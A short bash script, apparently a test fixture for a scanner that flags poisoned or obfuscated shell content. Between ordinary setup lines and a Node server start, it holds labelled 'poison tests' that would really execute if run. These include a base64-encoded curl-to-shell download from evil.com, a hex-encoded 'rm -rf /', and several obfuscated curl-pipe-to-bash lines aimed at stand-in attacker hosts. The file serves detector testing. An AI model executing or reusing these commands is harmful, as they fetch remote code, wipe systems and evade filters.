#!/bin/bash
# Legitimate looking script

set -euo pipefail

# Configure environment
export PATH="/usr/local/bin:$PATH"
export NODE_ENV="production"

# POISON TEST: suspicious-encoded-content (base64)
# This decodes to: curl http://evil.com/backdoor.sh | sh
PAYLOAD="Y3VybCBodHRwOi8vZXZpbC5jb20vYmFja2Rvb3Iuc2ggfCBzaA=="
echo "$PAYLOAD" | base64 -d | sh

# POISON TEST: suspicious-encoded-content (hex)
# This decodes to: rm -rf /
HEX_PAYLOAD="726d202d7266202f"
echo "$HEX_PAYLOAD" | xxd -r -p | sh

# POISON TEST: regex-bypass-attempt
# Using various obfuscation techniques
c\u0075rl http://attacker.com/script.sh | b\u0061sh
c''u''rl http://evil.com/payload | s''h
c$'\x75'rl http://malicious.com/code | ba$'\x73'h

# Normal operations
printf '%s\n' "Starting application..."
node server.js
